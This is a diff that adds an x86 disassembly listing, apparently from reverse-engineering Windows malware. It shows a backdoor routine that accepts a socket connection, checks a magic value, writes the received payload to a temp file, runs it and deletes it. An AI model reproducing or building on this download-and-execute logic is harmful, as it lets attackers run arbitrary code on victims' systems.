@@ -1,0 +1,147 @@
+  push    ebp
+  mov     ebp, esp
+  sub     esp, 664h
+  push    esi
+  xor     esi, esi
+  push    edi
+  mov     edi, recv
+  push    esi             ; flags
+  lea     eax, [ebp+netlong]
+  push    1               ; len
+  push    eax             ; buf
+  push    [ebp+s]         ; s
+  mov     [ebp+hObject], esi
+  call    edi ; recv
+  push    esi             ; flags
+  lea     eax, [ebp+netlong]
+  push    4               ; len
+  push    eax             ; buf
+  push    [ebp+s]         ; s
+  call    edi ; recv
+  push    dword ptr [ebp+netlong]; netlong
+  call    ntohl
+  cmp     eax, 133C9EA2h
+  mov     dword ptr [ebp+netlong], eax
+  jnz     loc_7E1A1645
+  lea     eax, [ebp+PathName]
+  push    eax             ; lpBuffer
+  push    104h            ; nBufferLength
+  call    GetTempPathA
+  lea     eax, [ebp+FileName]
+  push    eax             ; lpTempFileName
+  push    esi             ; uUnique
+  lea     eax, [ebp+PathName]
+  push    offset PrefixString; "tmp"
+  push    eax             ; lpPathName
+  call    GetTempFileNameA
+  push    esi             ; hTemplateFile
+  push    80h             ; dwFlagsAndAttributes
+  push    2               ; dwCreationDisposition
+  push    esi             ; lpSecurityAttributes
+  push    1               ; dwShareMode
+  lea     eax, [ebp+FileName]
+  push    40000000h       ; dwDesiredAccess
+  push    eax             ; lpFileName
+  call    CreateFileA
+  cmp     eax, esi
+  mov     [ebp+hObject], eax
+  jz      loc_7E1A1642
+  cmp     eax, 0FFFFFFFFh
+  jz      loc_7E1A1642
+  push    ebx
+  mov     ebx, 400h
+  jmp     short loc_7E1A1590
+
+loc_7E1A157A:
+  lea     ecx, [ebp+netlong]
+  push    esi             ; lpOverlapped
+  push    ecx             ; lpNumberOfBytesWritten
+  push    eax             ; nNumberOfBytesToWrite
+  lea     eax, [ebp+Buffer]
+  push    eax             ; lpBuffer
+  push    [ebp+hObject]   ; hFile
+  call    WriteFile
+
+loc_7E1A1590:
+  push    esi             ; flags
+  lea     eax, [ebp+Buffer]
+  push    ebx             ; len
+  push    eax             ; buf
+  push    [ebp+s]         ; s
+  call    edi ; recv
+  cmp     eax, esi
+  jg      short loc_7E1A157A
+  push    [ebp+hObject]   ; hObject
+  mov     edi, CloseHandle
+  call    edi ; CloseHandle
+  push    44h
+  lea     eax, [ebp+StartupInfo]
+  pop     ebx
+  push    ebx
+  push    esi
+  push    eax
+  call    sub_7E1A1CD0
+  xor     eax, eax
+  mov     [ebp+StartupInfo.cb], ebx
+  inc     eax
+  mov     [ebp+StartupInfo.dwFlags], 87h
+  mov     [ebp+StartupInfo.dwYSize], eax
+  mov     [ebp+StartupInfo.dwXSize], eax
+  lea     eax, [ebp+FileName]
+  mov     [ebp+StartupInfo.dwY], esi
+  push    eax
+  lea     eax, [ebp+Buffer]
+  push    offset aS       ; "\"%s\""
+  push    eax             ; LPSTR
+  mov     [ebp+StartupInfo.dwX], esi
+  mov     [ebp+StartupInfo.wShowWindow], si
+  call    wsprintfA
+  add     esp, 18h
+  lea     eax, [ebp+ProcessInformation]
+  push    eax             ; lpProcessInformation
+  lea     eax, [ebp+StartupInfo]
+  push    eax             ; lpStartupInfo
+  push    esi             ; lpCurrentDirectory
+  push    esi             ; lpEnvironment
+  push    esi             ; dwCreationFlags
+  push    esi             ; bInheritHandles
+  push    esi             ; lpThreadAttributes
+  lea     eax, [ebp+Buffer]
+  push    esi             ; lpProcessAttributes
+  push    eax             ; lpCommandLine
+  push    esi             ; lpApplicationName
+  call    CreateProcessA
+  test    eax, eax
+  pop     ebx
+  jz      short loc_7E1A1645
+  push    0FFFFFFFFh      ; dwMilliseconds
+  push    [ebp+ProcessInformation.hProcess]; hHandle
+  call    WaitForSingleObject
+  push    [ebp+ProcessInformation.hThread]; hObject
+  call    edi ; CloseHandle
+  push    [ebp+ProcessInformation.hProcess]; hObject
+  call    edi ; CloseHandle
+  lea     eax, [ebp+FileName]
+  push    eax             ; lpFileName
+  call    DeleteFileA
+  push    [ebp+s]         ; s
+  call    closesocket
+  jmp     short loc_7E1A1660
+
+loc_7E1A1642:
+  mov     [ebp+hObject], esi
+
+loc_7E1A1645:
+  push    [ebp+s]         ; s
+  call    closesocket
+  cmp     [ebp+hObject], esi
+  jz      short loc_7E1A1660
+  lea     eax, [ebp+FileName]
+  push    eax             ; lpFileName
+  call    DeleteFileA
+
+loc_7E1A1660:
+  pop     edi
+  pop     esi
+  leave
+  retn
